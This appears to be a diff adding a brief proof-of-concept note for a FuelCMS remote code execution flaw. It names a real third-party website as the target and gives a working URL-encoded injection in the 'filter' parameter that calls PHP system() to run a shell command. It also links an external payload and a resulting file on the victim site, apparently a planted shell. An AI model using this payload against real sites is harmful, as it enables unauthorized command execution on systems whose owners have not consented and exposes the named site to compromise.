@@ -1,0 +1,20 @@
+FUELCMS REMOTE CODE EXECUTION 
+
+PROLOG :
+[-]BUG ON site.com/fuel/pages/select/
+
+POC :
+[-] access the vulnerable site target.
+ example :
+https://www.escuelanutricionalvirtual.com/
+[-] input the payload ( imma not want paste here )
+https://pastebin.com/Rnbr3qyT
+[-] then gotcha,u got it
+view-source:https://www.escuelanutricionalvirtual.com//fuel/pages/select/?filter=%27%2bpi%28print%28%24a%3d%27system%27%29%29%2b%24a%28%27ls%20-la%27%29%2b%27
+
+RESULT :
+https://www.escuelanutricionalvirtual.com/yuno.php
+
+reference from :
+https://www.exploit-db.com/exploits/47138
+https://www.exploitkita.org/2019/07/fuelcms-remote-code-execution.html
